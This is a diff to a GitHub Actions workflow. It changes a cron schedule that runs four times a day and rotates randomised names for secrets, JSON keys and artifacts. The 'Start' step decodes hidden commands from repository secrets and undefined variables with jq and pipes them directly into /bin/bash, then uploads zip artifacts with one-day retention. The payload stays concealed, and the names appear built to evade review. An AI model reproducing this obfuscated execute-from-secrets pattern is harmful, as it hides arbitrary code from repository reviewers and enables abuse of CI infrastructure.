@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '23 1,7,13,19 * * *'
+    - cron: '39 3,9,15,21 * * *'
 env:
   CI: true
 jobs:
@@ -15,16 +15,14 @@ jobs:
           fetch-depth: 0
       - name: Start
         env:
-          axcj2: ${{ secrets.axcj2 }}
+          xodpe61: ${{ secrets.xodpe61 }}
         run: |
-          printf '%s' "$axcj2" | jq -r .amj8 | /bin/bash
-          printf '%s' "$foj8122" | jq -r .jum392 | /bin/bash
-          echo $l110 | jq -r .bxpk41478 | /bin/bash
-          echo $nuo72 | jq -r .lllcs2 | /bin/bash
+          printf '%s' "$xodpe61" | jq -r .aw1 | /bin/bash
+          echo $qcvr31057 | jq -r .ekxi995 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: IgyLCw45
+          name: DMTVYTNR
           path: "*.zip"
           retention-days: 1
